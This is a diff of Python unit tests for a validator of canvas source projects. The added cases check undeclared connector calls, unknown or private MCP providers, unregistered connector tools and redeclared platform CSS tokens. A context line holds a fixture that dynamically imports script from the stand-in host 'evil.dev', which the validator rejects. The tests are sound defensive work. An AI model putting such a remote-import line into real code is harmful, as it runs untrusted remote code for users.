@@ -123,6 +123,59 @@ class TestCanvasSourceAdapter(SimpleTestCase):
                 "action_not_registered",
             ),
             (
+                "undeclared_connector_call",
+                project(
+                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.connectors.call("github", "list_pull_requests", {});'}
+                ),
+                "capability_missing_connector",
+            ),
+            (
+                # Declaring the provider is not declaring every tool on it.
+                "connector_tool_undeclared_on_declared_provider",
+                project(
+                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.connectors.call("github", "search_issues", {});'},
+                    capabilities={
+                        "posthog": {},
+                        "network": {"origins": []},
+                        "connectors": [{"provider": "github", "tools": ["list_pull_requests"]}],
+                    },
+                ),
+                "capability_missing_connector",
+            ),
+            (
+                "unknown_connector_provider",
+                project(
+                    capabilities={
+                        "posthog": {},
+                        "network": {"origins": []},
+                        "connectors": [{"provider": "jira", "tools": ["list_issues"]}],
+                    }
+                ),
+                "connector_provider_unknown",
+            ),
+            (
+                "mcp_connector_with_private_host",
+                project(
+                    capabilities={
+                        "posthog": {},
+                        "network": {"origins": []},
+                        "connectors": [{"provider": "mcp:localhost", "tools": ["list_events"]}],
+                    }
+                ),
+                "connector_provider_unknown",
+            ),
+            (
+                "unregistered_native_connector_tool",
+                project(
+                    capabilities={
+                        "posthog": {},
+                        "network": {"origins": []},
+                        "connectors": [{"provider": "github", "tools": ["delete_repository"]}],
+                    }
+                ),
+                "connector_tool_not_registered",
+            ),
+            (
                 "dynamic_import",
                 project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
                 "forbidden_dynamic_import",
@@ -136,6 +189,23 @@ class TestCanvasSourceAdapter(SimpleTestCase):
                 "inline_script_tag",
                 project(files={CANVAS_COMPONENT_PATH: 'const html = "<script src=x></script>";'}),
                 "forbidden_inline_script",
+            ),
+            (
+                "platform_token_in_stylesheet",
+                project(files={CANVAS_COMPONENT_PATH: CODE, "src/styles.css": ":root { --muted: #5d5a52; }"}),
+                "platform_token_redeclared",
+            ),
+            (
+                "platform_token_in_inline_style",
+                project(files={CANVAS_COMPONENT_PATH: CODE + "const css = `html.dark { --background:#141416 }`;"}),
+                "platform_token_redeclared",
+            ),
+            (
+                "platform_token_in_entry_html",
+                project(
+                    files={CANVAS_ENTRY_HTML: '<style>\n:root {\n  --muted: #5d5a52;\n}\n</style><div id="root"></div>'}
+                ),
+                "platform_token_redeclared",
             ),
             (
                 "file_too_large",
@@ -192,6 +262,42 @@ class TestCanvasSourceAdapter(SimpleTestCase):
         )
         diagnostics = validate_source_project(candidate)
         self.assertNotIn("capability_missing_state", [d["code"] for d in diagnostics])
+
+    @parameterized.expand(
+        [
+            (
+                "prefixed_and_suffixed_names",
+                "src/styles.css",
+                ":root { --doc-muted: #5d5a52; --muted-foreground: #444; } .lead { color: var(--muted); }",
+            ),
+            ("comment_mentioning_token", CANVAS_COMPONENT_PATH, CODE + "// --muted: legacy name, do not use\n"),
+            (
+                "prose_mentioning_token",
+                CANVAS_COMPONENT_PATH,
+                CODE + 'const hint = "Rename --muted: it is reserved";\n',
+            ),
+        ]
+    )
+    def test_platform_token_uses_and_mentions_pass(self, _name: str, path: str, content: str) -> None:
+        candidate = project(files={CANVAS_COMPONENT_PATH: CODE, path: content})
+        self.assertEqual(validate_source_project(candidate), [])
+
+    @parameterized.expand([("same_file", True), ("capabilities_only", False)])
+    def test_connectors_cannot_declare_shared_state(self, _name, include_calls):
+        candidate = project(
+            files={
+                CANVAS_COMPONENT_PATH: CODE
+                + ('ph.connectors.call("mcp:mcp.example.com", "list_events", {});' if include_calls else "")
+            },
+            capabilities={
+                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": [], "state": ["shared"]},
+                "network": {"origins": []},
+                "connectors": [{"provider": "mcp:mcp.example.com", "tools": ["list_events"]}],
+            },
+        )
+        diagnostics = validate_source_project(candidate)
+        self.assertTrue(has_errors(diagnostics), diagnostics)
+        self.assertIn("connector_results_in_shared_state", [d["code"] for d in diagnostics])
 
     def test_direct_network_calls_warn_but_stay_publishable(self):
         candidate = project(files={CANVAS_COMPONENT_PATH: CODE + "fetch(dynamicUrl);"})
